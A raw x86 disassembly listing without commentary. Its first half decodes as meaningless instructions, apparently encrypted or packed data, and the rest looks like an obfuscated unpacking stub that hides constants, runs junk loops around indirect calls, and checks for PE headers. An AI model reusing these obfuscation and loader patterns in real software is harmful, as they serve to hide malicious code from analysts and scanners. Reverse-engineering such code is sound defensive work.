  40c645:	test   BYTE PTR ss:[edx+0x76],dl
  40c649:	pushf  
  40c64a:	jp     0x40c68f
  40c64c:	mov    ss,WORD PTR [edx+0x6ae9c81f]
  40c652:	and    al,0xf7
  40c654:	push   es
  40c655:	ins    BYTE PTR es:[edi],dx
  40c656:	push   cs
  40c657:	fnstcw WORD PTR [ebp-0x26]
  40c65a:	aad    0xfc
  40c65c:	and    bl,BYTE PTR [esi]
  40c65e:	fadd   QWORD PTR [ebp+0x5f]
  40c661:	clc    
  40c662:	jge    0x40c688
  40c664:	mov    dh,BYTE PTR [ebx]
  40c666:	je     0x40c663
  40c668:	out    dx,eax
  40c669:	int    0xce
  40c66b:	add    ebp,0xffffff85
  40c66e:	push   edi
  40c66f:	outs   dx,DWORD PTR ds:[esi]
  40c670:	pop    eax
  40c671:	xor    eax,0x7a9bf2a1
  40c676:	xchg   ebx,eax
  40c677:	xchg   bl,dh
  40c679:	xchg   ah,al
  40c67b:	stos   BYTE PTR es:[edi],al
  40c67c:	scas   al,BYTE PTR es:[edi]
  40c67d:	or     ch,BYTE PTR [ebx+0x4d]
  40c680:	fstp   DWORD PTR [edi+edx*2-0x5e]
  40c684:	jle    0x40c68b
  40c686:	addr16 xor eax,0x4404c10a
  40c68c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c68d:	dec    esi
  40c68e:	pop    esi
  40c68f:	test   BYTE PTR [ecx],ch
  40c691:	jmp    0x29c3:0x66a19c0
  40c698:	push   edx
  40c699:	out    dx,al
  40c69a:	cli    
  40c69b:	push   cs
  40c69c:	mov    dh,0x8d
  40c69e:	sub    eax,0x7a218e52
  40c6a3:	cmc    
  40c6a4:	pop    ebx
  40c6a5:	push   es
  40c6a6:	mov    ch,0x7f
  40c6a8:	sbb    eax,esp
  40c6aa:	inc    eax
  40c6ab:	js     0x40c6dc
  40c6ad:	xor    BYTE PTR [esi+0xb6ac62b],0x66
  40c6b4:	stos   DWORD PTR es:[edi],eax
  40c6b5:	inc    ebp
  40c6b6:	imul   edi,edi,0xffffffa5
  40c6b9:	jp     0x40c6c5
  40c6bb:	call   DWORD PTR [esi+0x2d]
  40c6be:	mov    dl,dh
  40c6c0:	jo     0x40c72b
  40c6c2:	sub    DWORD PTR [edx+eax*4-0x6c1b59cd],0x51e45a53
  40c6cd:	icebp  
  40c6ce:	loope  0x40c6f3
  40c6d0:	adc    bl,BYTE PTR [edi-0x6882f426]
  40c6d6:	sub    ebp,edx
  40c6d8:	sbb    DWORD PTR [edi],edi
  40c6da:	(bad)  
  40c6db:	js     0x40c6dd
  40c6dd:	cli    
  40c6de:	mov    ebp,0xd37fefab
  40c6e3:	pop    es
  40c6e4:	and    BYTE PTR [edi+0x13a466eb],al
  40c6ea:	cmp    eax,0xf1c67166
  40c6ef:	push   ecx
  40c6f0:	nop
  40c6f1:	fmulp  st(4),st
  40c6f3:	fwait
  40c6f4:	xchg   esp,eax
  40c6f5:	imul   edi,ebx,0xffffffb6
  40c6f8:	sbb    BYTE PTR [ebx+0x2dc57d77],0x84
  40c6ff:	mov    ds:0x46e75cd3,al
  40c704:	repnz dec eax
  40c706:	or     edx,DWORD PTR [ebx-0x56]
  40c709:	mov    ah,BYTE PTR [ebp+edx*2+0x7b]
  40c70d:	sbb    dl,BYTE PTR [ebx+0x25]
  40c710:	sbb    al,0x3b
  40c712:	mov    ch,BYTE PTR [ebx+edx*2+0x4a557fbf]
  40c719:	pop    esp
  40c71a:	rcl    BYTE PTR [eax+ebp*8-0x2],1
  40c71e:	fnstenv [esi]
  40c720:	xchg   edx,eax
  40c721:	lock outs dx,DWORD PTR ds:[esi]
  40c723:	xchg   bx,ax
  40c725:	inc    esp
  40c726:	add    bh,BYTE PTR [esi]
  40c728:	loopne 0x40c73a
  40c72a:	dec    esi
  40c72b:	imul   esp,DWORD PTR [ecx],0xa3391445
  40c731:	sub    bh,BYTE PTR [ebp-0x3f]
  40c734:	cmp    al,0x9c
  40c736:	sub    DWORD PTR [ebx],eax
  40c738:	scas   al,BYTE PTR es:[edi]
  40c739:	mov    bh,0xad
  40c73b:	mov    ch,0x97
  40c73d:	jmp    0x40c752
  40c73f:	in     eax,dx
  40c740:	add    ecx,eax
  40c742:	aaa    
  40c743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c744:	cs cwde 
  40c746:	mov    edx,0x9ff47916
  40c74b:	mov    edx,0x4f059d4
  40c750:	fdivrp st(3),st
  40c752:	sbb    BYTE PTR [eax+0x5d],bl
  40c755:	dec    esp
  40c756:	and    cl,cl
  40c758:	pop    esp
  40c759:	jb     0x40c74c
  40c75b:	outs   dx,DWORD PTR ds:[esi]
  40c75c:	call   0x2c55b85b
  40c761:	scas   eax,DWORD PTR es:[edi]
  40c762:	loop   0x40c79e
  40c764:	loope  0x40c786
  40c766:	and    edi,DWORD PTR [ebx+0xe337ea7]
  40c76c:	loope  0x40c737
  40c76e:	jl     0x40c71a
  40c770:	mul    DWORD PTR [eax-0x26a56c0b]
  40c776:	sbb    DWORD PTR [ebp+0x6e],0x47e83de1
  40c77d:	xchg   ebx,eax
  40c77e:	mov    edx,0xa86b2d20
  40c783:	pop    es
  40c784:	fld1   
  40c786:	shr    BYTE PTR fs:[eax-0x3b],cl
  40c78a:	inc    ebp
  40c78b:	loop   0x40c724
  40c78d:	test   al,0x6d
  40c78f:	les    esi,FWORD PTR [edx]
  40c791:	adc    eax,0x4c1f0a78
  40c796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c797:	inc    eax
  40c798:	(bad)  
  40c799:	call   0x190092d0
  40c79e:	in     al,dx
  40c79f:	rcl    BYTE PTR [edx],0x94
  40c7a2:	in     al,0xe5
  40c7a4:	sub    cl,BYTE PTR [edi+edx*2]
  40c7a7:	rol    BYTE PTR [ebp+0x5],1
  40c7aa:	push   esp
  40c7ab:	xor    esp,0xf39c9838
  40c7b1:	pop    edx
  40c7b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7b3:	jg     0x40c815
  40c7b5:	sbb    al,0x35
  40c7b7:	pop    es
  40c7b8:	mov    eax,ds:0xdac74ee0
  40c7bd:	in     al,dx
  40c7be:	pop    edx
  40c7bf:	dec    ebp
  40c7c0:	mov    al,0xe3
  40c7c2:	(bad)  
  40c7c4:	mov    ebx,0xeb5b8cfd
  40c7c9:	ret    
  40c7ca:	pop    edi
  40c7cb:	into   
  40c7cc:	and    BYTE PTR [ebx+0x6d],dh
  40c7cf:	and    eax,0x10829bd4
  40c7d4:	lds    eax,FWORD PTR ds:0x8bf84d8b
  40c7da:	or     DWORD PTR [ebx+0x45890804],ecx
  40c7e0:	loopne 0x40c76d
  40c7e2:	inc    ebp
  40c7e3:	or     BYTE PTR [ebx],dh
  40c7e5:	mov    BYTE PTR [ebx],0xc7
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	test   DWORD PTR [ebp+0x23],esp
  40c802:	dec    ebx
  40c803:	leave  
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c7f8
  40c80c:	xor    bl,BYTE PTR [ecx]
  40c80e:	jmp    0xc180:0x74bd0de5
  40c815:	xor    eax,0x3a8f17e6
  40c81a:	arpl   WORD PTR ds:0x71efdc41,bx
  40c820:	jns    0x40c856
  40c822:	jbe    0x40c7ce
  40c824:	ins    BYTE PTR es:[edi],dx
  40c825:	inc    ecx
  40c826:	push   eax
  40c827:	cwde   
  40c828:	iret   
  40c829:	xchg   ebx,eax
  40c82a:	scas   eax,DWORD PTR es:[edi]
  40c82b:	bound  ecx,QWORD PTR [ecx-0x4a32cf0c]
  40c831:	fisttp QWORD PTR [ecx+eiz*8]
  40c834:	add    BYTE PTR gs:[ebp-0x80],bl
  40c838:	push   es
  40c839:	stc    
  40c83a:	sbb    al,0x3a
  40c83c:	cmp    BYTE PTR [esi-0x14],ch
  40c83f:	sub    al,dl
  40c841:	cs inc edx
  40c843:	(bad)  
  40c844:	fdivr  st(6),st
  40c846:	(bad)  
  40c847:	out    dx,eax
  40c848:	push   esi
  40c849:	out    dx,eax
  40c84a:	out    dx,al
  40c84b:	inc    edi
  40c84c:	or     BYTE PTR [ecx-0x6b],al
  40c84f:	clc    
  40c850:	mov    eax,ds:0x9d45488f
  40c855:	cli    
  40c856:	push   edi
  40c857:	fld    TBYTE PTR [edx+0x2c066ed3]
  40c85d:	iret   
  40c85e:	aaa    
  40c85f:	(bad)
  40c862:	xchg   ecx,eax
  40c863:	sbb    ah,cl
  40c865:	fdiv   DWORD PTR [ebx]
  40c867:	in     al,dx
  40c868:	mov    esp,0xa81faba4
  40c86d:	dec    ebp
  40c86e:	ds pop ebp
  40c870:	shl    BYTE PTR [edx+0xb],1
  40c873:	sahf   
  40c874:	mov    esi,0x46f05ad7
  40c879:	in     al,0x5b
  40c87b:	mov    ebx,0xc5399aa6
  40c880:	int    0x5d
  40c882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c883:	sub    al,0x35
  40c885:	mov    WORD PTR [esi+esi*1+0x20],?
  40c889:	xchg   ecx,eax
  40c88a:	inc    esi
  40c88b:	xor    edi,esp
  40c88d:	mov    esi,0x46724fcd
  40c892:	push   ss
  40c893:	scas   eax,DWORD PTR es:[edi]
  40c894:	xchg   edi,eax
  40c895:	xchg   edi,eax
  40c896:	xor    BYTE PTR [esi],bl
  40c898:	push   0x40
  40c89a:	inc    eax
  40c89b:	fidivr WORD PTR ds:0x82082edd
  40c8a1:	imul   esp,ebp,0x368dc6c
  40c8a7:	bound  esp,QWORD PTR [ebx+0x14eab5c1]
  40c8ad:	mov    esp,DWORD PTR [eax-0x23bed13f]
  40c8b3:	sbb    eax,0xc6036899
  40c8b8:	jmp    0x11e:0x505b4079
  40c8bf:	mov    esi,DWORD PTR [edx-0xa4be76a]
  40c8c5:	in     eax,dx
  40c8c6:	push   eax
  40c8c7:	xlat   BYTE PTR ds:[ebx]
  40c8c8:	sbb    al,0x34
  40c8ca:	neg    DWORD PTR [ebp+0x3f]
  40c8cd:	pop    DWORD PTR [eax-0x62b607b0]
  40c8d3:	mov    esp,0x41513d5e
  40c8d8:	call   0xf65e3739
  40c8dd:	std    
  40c8de:	cli    
  40c8df:	pusha  
  40c8e0:	xor    al,0x5b
  40c8e2:	mov    BYTE PTR [edi],0x2e
  40c8e5:	les    esi,FWORD PTR [eax+0x7bec0c3b]
  40c8eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8ec:	jb     0x40c8df
  40c8ee:	mov    edx,0x30ab134e
  40c8f3:	adc    ecx,DWORD PTR [edi-0x41fa8a32]
  40c8f9:	and    BYTE PTR [eax+0x70],al
  40c8fc:	stos   BYTE PTR es:[edi],al
  40c8fd:	xor    ecx,esp
  40c8ff:	icebp  
  40c900:	(bad)  
  40c901:	and    eax,0x4ea8c597
  40c906:	jg     0x40c8cc
  40c908:	mov    cl,0xbd
  40c90a:	loopne 0x40c911
  40c90c:	aaa    
  40c90d:	retf   
  40c90e:	xor    bh,BYTE PTR [edi]
  40c910:	cld    
  40c911:	xor    DWORD PTR ds:0x601ba09,ecx
  40c917:	xchg   ecx,eax
  40c918:	push   ds
  40c919:	int3   
  40c91a:	mov    DWORD PTR [edx-0x3],eax
  40c91d:	retf   
  40c91e:	jno    0x40c8df
  40c920:	cmc    
  40c921:	dec    ecx
  40c922:	jae    0x40c988
  40c924:	adc    BYTE PTR [esi],0x8d
  40c927:	ins    BYTE PTR es:[edi],dx
  40c928:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c92a:	ss loope 0x40c978
  40c92d:	loope  0x40c95b
  40c92f:	stos   BYTE PTR es:[edi],al
  40c930:	into   
  40c931:	xchg   bl,ah
  40c933:	inc    ebx
  40c934:	push   ds
  40c935:	out    0xe0,al
  40c937:	sbb    al,0x68
  40c93a:	out    dx,al
  40c93b:	mov    esi,0x18821622
  40c940:	test   eax,edi
  40c942:	repz or edi,eax
  40c945:	push   ecx
  40c946:	(bad)  
  40c949:	fwait
  40c94a:	cmp    eax,DWORD PTR [edi+0x26]
  40c94d:	es pop esi
  40c94f:	jns    0x40c92b
  40c951:	imul   ecx,DWORD PTR [eax+eax*8+0x55],0x1afdd662
  40c959:	push   ds
  40c95a:	stos   BYTE PTR es:[edi],al
  40c95b:	pop    edi
  40c95c:	mov    ch,0xee
  40c95e:	push   ecx
  40c95f:	je     0x40c8ff
  40c961:	into   
  40c962:	mov    ah,dh
  40c964:	dec    esi
  40c965:	mov    dh,0x7a
  40c967:	sbb    DWORD PTR [edi+esi*4-0x18],esp
  40c96b:	shl    BYTE PTR [ecx+0x646d1f8d],cl
  40c971:	cmp    WORD PTR [esi-0x1f],bp
  40c975:	in     eax,dx
  40c976:	ja     0x40c97b
  40c978:	mov    edx,0x20116e56
  40c97d:	push   ebp
  40c97e:	adc    al,0x38
  40c980:	cmp    esi,DWORD PTR [eax+0x29eecfe0]
  40c986:	mov    eax,ds:0xf1371774
  40c98b:	push   0xe26b169b
  40c990:	mov    ds:0xbf7cdb1e,eax
  40c995:	dec    ecx
  40c996:	in     eax,0x18
  40c998:	shr    esi,0x5
  40c99b:	clc    
  40c99c:	test   DWORD PTR [edx+0x5d],esi
  40c99f:	loope  0x40c957
  40c9a1:	add    eax,0x7be123f9
  40c9a6:	xor    cl,BYTE PTR [edi+ebx*8]
  40c9a9:	lock scas al,BYTE PTR es:[edi]
  40c9ab:	lahf   
  40c9ac:	bound  ebp,QWORD PTR [esi+0x25]
  40c9af:	ds cmc 
  40c9b1:	aaa    
  40c9b2:	and    bl,bh
  40c9b4:	int3   
  40c9b5:	push   es
  40c9b6:	sbb    BYTE PTR [eax],bl
  40c9b8:	mov    eax,ds:0xb7aa00e4
  40c9bd:	inc    edx
  40c9be:	inc    ecx
  40c9bf:	stos   DWORD PTR es:[edi],eax
  40c9c0:	inc    ecx
  40c9c1:	dec    esi
  40c9c2:	outs   dx,DWORD PTR ds:[esi]
  40c9c3:	and    al,0x8e
  40c9c5:	aaa    
  40c9c6:	or     DWORD PTR [ebx-0x3b],ebx
  40c9c9:	in     al,dx
  40c9ca:	or     eax,0xb38a399c
  40c9cf:	(bad)  
  40c9d0:	jl     0x40c988
  40c9d2:	add    esi,DWORD PTR [esi+0x1b]
  40c9d5:	and    dh,BYTE PTR [esi]
  40c9d7:	shl    BYTE PTR [ebp-0x4002d34f],cl
  40c9dd:	sbb    al,0x8c
  40c9df:	mov    ah,BYTE PTR [edi+0x6a44977a]
  40c9e5:	sti    
  40c9e6:	stos   DWORD PTR es:[edi],eax
  40c9e7:	mov    ebx,DWORD PTR [edx+0xd3e1fe3]
  40c9ed:	in     eax,dx
  40c9ee:	les    esi,FWORD PTR [esi+0x57de1512]
  40c9f4:	mov    dh,0x44
  40c9f6:	sahf   
  40c9f7:	dec    ebp
  40c9f8:	rcr    edx,cl
  40c9fa:	aas    
  40c9fb:	fadd   DWORD PTR [edi]
  40c9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9fe:	aas    
  40c9ff:	and    BYTE PTR [edi+0x422315be],cl
  40ca05:	inc    esp
  40ca06:	lds    edx,FWORD PTR ds:0x87325c06
  40ca0c:	jb     0x40ca4d
  40ca0e:	sbb    ah,bh
  40ca10:	loope  0x40c9a1
  40ca12:	sub    eax,0xf87c1f5d
  40ca17:	sbb    cl,dh
  40ca19:	or     al,BYTE PTR es:0x13c5477b
  40ca20:	pop    ebp
  40ca21:	xchg   BYTE PTR [eax],bh
  40ca23:	es clc 
  40ca25:	push   esi
  40ca26:	xor    DWORD PTR cs:[esi-0x2ee4c0ea],ebx
  40ca2d:	sbb    DWORD PTR cs:[ecx-0x63],edx
  40ca31:	pop    edx
  40ca32:	in     al,0x5e
  40ca34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca35:	dec    eax
  40ca36:	lahf   
  40ca37:	(bad)  
  40ca38:	stc    
  40ca39:	ds xchg ebp,eax
  40ca3b:	into   
  40ca3c:	int    0x65
  40ca3e:	jmp    0x3f149987
  40ca43:	test   al,0xba
  40ca45:	out    0xc4,al
  40ca47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca48:	sub    DWORD PTR [ebp-0xb],ebx
  40ca4b:	in     eax,0x2e
  40ca4d:	mov    dh,0xc
  40ca4f:	dec    ebp
  40ca50:	pop    ss
  40ca51:	mov    ebx,0xcf8d33f5
  40ca56:	cmp    ebx,edi
  40ca58:	popf   
  40ca59:	in     al,dx
  40ca5a:	mov    al,0xe1
  40ca5c:	and    BYTE PTR [ebp-0x12],cl
  40ca5f:	stos   DWORD PTR es:[edi],eax
  40ca60:	std    
  40ca61:	dec    edx
  40ca62:	test   BYTE PTR [ebx-0x48],bl
  40ca65:	jno    0x40ca42
  40ca67:	mov    dl,0xe2
  40ca69:	fsub   QWORD PTR [ecx+0x6d]
  40ca6c:	dec    edi
  40ca6d:	mov    bl,0xdf
  40ca6f:	and    DWORD PTR [esi],0x82b8b624
  40ca75:	lods   eax,DWORD PTR ds:[esi]
  40ca76:	pusha  
  40ca77:	dec    ecx
  40ca78:	popa   
  40ca79:	mov    BYTE PTR [ecx],0x28
  40ca7c:	adc    esi,ebx
  40ca7e:	arpl   WORD PTR [ecx],ax
  40ca80:	sar    DWORD PTR [esi-0x1ee41d7c],cl
  40ca86:	(bad)  
  40ca87:	lds    edx,FWORD PTR [edx-0x3dd53691]
  40ca8d:	pop    ds
  40ca8e:	int    0xd8
  40ca90:	xchg   DWORD PTR [ebp+0x77],ebp
  40ca93:	lds    ebp,FWORD PTR [ebx+0x7cd5a41a]
  40ca99:	icebp  
  40ca9a:	retf   0xd6b2
  40ca9d:	mov    edx,0xfe40854
  40caa2:	iret   
  40caa3:	inc    ebx
  40caa4:	mov    WORD PTR [eax-0x37353030],gs
  40caaa:	inc    ebx
  40caab:	cmp    al,0x56
  40caad:	jp     0x40cb07
  40caaf:	inc    ebp
  40cab0:	rcl    BYTE PTR [esi-0x1690da6b],cl
  40cab6:	or     bh,BYTE PTR [ecx+0x26]
  40cab9:	sbb    BYTE PTR [eax],ch
  40cabb:	jp     0x40cab0
  40cabd:	stc    
  40cabe:	add    al,0xbd
  40cac0:	std    
  40cac1:	mov    eax,ds:0x7f0d0f17
  40cac6:	mov    edi,0xceec3d2a
  40cacb:	int3   
  40cacc:	in     eax,dx
  40cacd:	jbe    0x40cadd
  40cacf:	out    dx,eax
  40cad0:	mov    gs,WORD PTR [eax]
  40cad2:	jp     0x40cad5
  40cad4:	js     0x40cb47
  40cad6:	ins    BYTE PTR es:[edi],dx
  40cad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cad8:	cmp    eax,0x4ce4f0e3
  40cadd:	loope  0x40cab5
  40cadf:	push   ds
  40cae0:	and    DWORD PTR [eax-0x16],edi
  40cae3:	push   ebx
  40cae4:	in     al,0xc1
  40cae6:	xchg   DWORD PTR [edi-0x7b7a22fc],ebx
  40caec:	add    esp,esi
  40caee:	ror    BYTE PTR [ebx-0x1],cl
  40caf1:	fwait
  40caf2:	popa   
  40caf3:	add    eax,0xc41c1bda
  40caf8:	push   edi
  40caf9:	fst    DWORD PTR [ebx-0x44278627]
  40caff:	jmp    0x4b1e:0xfc045345
  40cb06:	cmp    DWORD PTR [ecx+0x100ee850],esp
  40cb0c:	hlt    
  40cb0d:	mov    bl,BYTE PTR [esi]
  40cb0f:	sub    BYTE PTR [ebx+0x22],dh
  40cb12:	jmp    0x454b5932
  40cb17:	sub    al,0x90
  40cb19:	out    0x12,al
  40cb1b:	in     al,dx
  40cb1c:	lods   eax,DWORD PTR ds:[esi]
  40cb1d:	mov    BYTE PTR [ecx+0x4aaef731],ch
  40cb23:	pop    ss
  40cb24:	push   edx
  40cb25:	mov    esp,0x58f638fd
  40cb2a:	cmp    al,0x6a
  40cb2c:	inc    ecx
  40cb2d:	js     0x40cae6
  40cb2f:	xchg   BYTE PTR [ecx-0x3bbb213],bl
  40cb35:	jecxz  0x40cb34
  40cb37:	add    esp,DWORD PTR [ebx+eax*2]
  40cb3a:	hlt    
  40cb3b:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb3e:	xor    eax,esi
  40cb40:	add    eax,edi
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x4302d5,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x4302d5
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x4302d5,eax
  40cbe0:	cmp    DWORD PTR ds:0x4302d5,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x4302d5,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42e88b
  40cc05:	cmp    DWORD PTR ds:0x4302d5,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x4302d5
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x4302d5,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x4302bd,0x0
  40cc2f:	mov    eax,ds:0x4302bd
  40cc34:	inc    eax
  40cc35:	mov    ds:0x4302bd,eax
  40cc3a:	cmp    DWORD PTR ds:0x4302bd,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e797
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42e94b
  40cc6b:	cmp    DWORD PTR ds:0x4302bd,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e64c,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x430357,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ecd9
  40cd16:	mov    eax,ds:0x4302fd
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42ec57
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x4302ed,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x430367,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e640,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x4302f1,0x42ec4f
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x4302b9,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x4302bd,0x4302c9
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42ec4b
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x4302c9,0x0
  40cde2:	mov    eax,ds:0x4302c9
  40cde7:	inc    eax
  40cde8:	mov    ds:0x4302c9,eax
  40cded:	cmp    DWORD PTR ds:0x4302c9,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42e94f
  40ce06:	cmp    DWORD PTR ds:0x4302c9,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42ec57,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x43034f,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ec63,0x43035f
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e64c,0x9d3
  40ce6c:	je     0x40cf83
